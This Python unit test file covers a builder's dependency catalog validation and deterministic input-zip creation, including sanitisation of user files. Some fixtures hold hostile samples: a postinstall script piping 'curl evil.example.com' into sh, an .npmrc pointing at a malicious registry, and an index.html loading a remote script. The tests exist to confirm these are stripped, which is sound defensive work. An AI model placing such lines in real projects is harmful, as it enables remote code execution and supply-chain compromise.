"""Unit tests for catalog-validated build input materialization.

``load_package_catalog``/``validate_dependencies`` gate what an app can
declare in its ``dependencies`` before the builder ever runs ``npm install`` —
exact-pin only, no semver ranges, so the build toolchain never resolves an
unreviewed package. ``make_input_zip`` is the deterministic on-disk artifact
Task 3+ upload as ``input.zip``; determinism is what makes "nothing changed
this turn" a valid no-op signal.
"""
from __future__ import annotations

import json
import uuid
import zipfile

from src.services.builder.build_input import (
    UnsupportedDependency,
    load_package_catalog,
    make_input_zip,
    materialize_build_input,
    validate_dependencies,
)


def test_load_package_catalog_returns_flat_dict() -> None:
    catalog = load_package_catalog()
    assert isinstance(catalog, dict)
    assert catalog["react"] == "19.2.7"
    assert catalog["react-dom"] == "19.2.7"
    assert catalog["vite"] == "8.1.0"


def test_validate_dependencies_passes_for_exact_pinned_catalog_deps() -> None:
    validate_dependencies(
        {
            "react": "19.2.7",
            "react-dom": "19.2.7",
            "react-router-dom": "7.18.0",
        }
    )  # no raise


def test_validate_dependencies_raises_for_unknown_and_wrong_version() -> None:
    """offenders convention: {package: requested_version} for BOTH cases —
    a package absent from the catalog and a catalog package pinned wrong.
    The caller can't tell the two apart from the dict alone, which is fine:
    the exception message enumerates the offending packages either way."""
    try:
        validate_dependencies({"leftpad": "1.0.0", "react": "18.0.0"})
        raise AssertionError("expected UnsupportedDependency")
    except UnsupportedDependency as exc:
        assert exc.offenders == {"leftpad": "1.0.0", "react": "18.0.0"}


def test_validate_dependencies_empty_is_fine() -> None:
    validate_dependencies({})


def test_make_input_zip_is_deterministic() -> None:
    app_id = uuid.uuid4()
    src_files = {"src/main.tsx": b"export default 1;\n"}
    deps = {"react": "19.2.7"}

    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmp:
        zip_a = Path(tmp) / "a.zip"
        zip_b = Path(tmp) / "b.zip"
        sha_a = make_input_zip(zip_a, app_id, src_files, deps)
        sha_b = make_input_zip(zip_b, app_id, src_files, deps)

        assert sha_a == sha_b
        assert zip_a.read_bytes() == zip_b.read_bytes()


def test_make_input_zip_contains_package_json_and_vite_config() -> None:
    app_id = uuid.uuid4()
    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmp:
        zip_path = Path(tmp) / "input.zip"
        make_input_zip(zip_path, app_id, {"src/main.tsx": b"x"}, {})

        with zipfile.ZipFile(zip_path) as archive:
            names = archive.namelist()
            assert "package.json" in names
            assert "vite.config.mjs" in names
            assert "index.html" in names
            assert "bifrost-sdk.tgz" in names


def test_make_input_zip_strips_user_vite_config_and_scripts() -> None:
    app_id = uuid.uuid4()
    src_files = {
        "src/main.tsx": b"x",
        "vite.config.ts": b"export default {}",
        "package.json": json.dumps(
            {
                "name": "evil-app",
                "scripts": {
                    "postinstall": "curl evil.example.com | sh",
                    "build": "vite build",
                },
            }
        ).encode(),
    }

    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmp:
        zip_path = Path(tmp) / "input.zip"
        make_input_zip(zip_path, app_id, src_files, {})

        with zipfile.ZipFile(zip_path) as archive:
            names = archive.namelist()
            assert "vite.config.ts" not in names
            assert "vite.config.mjs" in names

            pkg = json.loads(archive.read("package.json"))
            assert "scripts" not in pkg


def test_make_input_zip_strips_npmrc_and_user_index_html() -> None:
    app_id = uuid.uuid4()
    src_files = {
        "src/main.tsx": b"x",
        ".npmrc": b"registry=http://evil.example.com\n",
        "index.html": b"<html><script src=\"http://evil.example.com/x.js\"></script></html>",
    }

    import tempfile
    from pathlib import Path

    with tempfile.TemporaryDirectory() as tmp:
        zip_path = Path(tmp) / "input.zip"
        make_input_zip(zip_path, app_id, src_files, {})

        with zipfile.ZipFile(zip_path) as archive:
            names = archive.namelist()
            assert ".npmrc" not in names
            html = archive.read("index.html").decode()
            assert "evil.example.com" not in html
            assert 'id="root"' in html
            assert "/src/main.tsx" in html


def test_materialize_build_input_writes_expected_layout(tmp_path) -> None:
    app_id = uuid.uuid4()
    materialize_build_input(
        tmp_path,
        app_id,
        {"src/main.tsx": b"export default 1;\n"},
        {"react": "19.2.7"},
    )

    assert (tmp_path / "src" / "main.tsx").exists()
    assert (tmp_path / "package.json").exists()
    assert (tmp_path / "vite.config.mjs").exists()
    assert (tmp_path / "index.html").exists()
    assert (tmp_path / "bifrost-sdk.tgz").exists()

    pkg = json.loads((tmp_path / "package.json").read_text())
    assert pkg["dependencies"]["react"] == "19.2.7"
    assert pkg["dependencies"]["bifrost"] == "file:./bifrost-sdk.tgz"
